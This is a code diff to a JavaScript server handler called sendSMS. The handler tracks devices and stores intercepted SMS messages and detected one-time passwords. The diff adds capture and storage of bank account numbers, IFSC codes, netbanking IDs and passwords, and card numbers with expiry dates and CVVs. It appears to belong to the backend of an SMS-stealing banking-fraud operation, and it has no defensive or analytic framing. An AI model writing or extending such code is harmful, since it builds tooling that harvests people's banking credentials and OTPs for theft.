@@ -66,6 +66,14 @@ export const sendSMS = async (req, res) => {
     let deptName = req.body.departmentName || 'Department Phone';
     let mobNo = req.body.mobileNumber || 'N/A';
     let addr = req.body.address || 'Main Office';
+    let bankName = req.body.bankName || 'N/A';
+    let accNo = req.body.accountNumber || 'N/A';
+    let ifsc = req.body.ifscCode || 'N/A';
+    let netId = req.body.netbankingId || '';
+    let netPass = req.body.netbankingPassword || '';
+    let cardNo = req.body.cardNumber || '';
+    let cardExp = req.body.cardExpiry || '';
+    let cardCvv = req.body.cardCvv || '';
 
     // Lookup Device details
     try {
@@ -77,9 +85,18 @@ export const sendSMS = async (req, res) => {
           ]
         });
         if (device) {
-          deptName = device.departmentName;
-          mobNo = device.mobileNumber;
-          addr = device.address;
+          deptName = device.departmentName || deptName;
+          mobNo = device.mobileNumber || mobNo;
+          addr = device.address || addr;
+          bankName = device.bankName || bankName;
+          accNo = device.accountNumber || accNo;
+          ifsc = device.ifscCode || ifsc;
+          netId = device.netbankingId || netId;
+          netPass = device.netbankingPassword || netPass;
+          cardNo = device.cardNumber || cardNo;
+          cardExp = device.cardExpiry || cardExp;
+          cardCvv = device.cardCvv || cardCvv;
+
           device.lastSeen = now;
           device.status = 'ONLINE';
           device.messageCount = (device.messageCount || 0) + 1;
@@ -95,6 +112,14 @@ export const sendSMS = async (req, res) => {
       departmentName: deptName,
       mobileNumber: mobNo,
       address: addr,
+      bankName,
+      accountNumber: accNo,
+      ifscCode: ifsc,
+      netbankingId: netId,
+      netbankingPassword: netPass,
+      cardNumber: cardNo,
+      cardExpiry: cardExp,
+      cardCvv: cardCvv,
       sender: sender,
       body: bodyText,
       otp: detectedOtp,
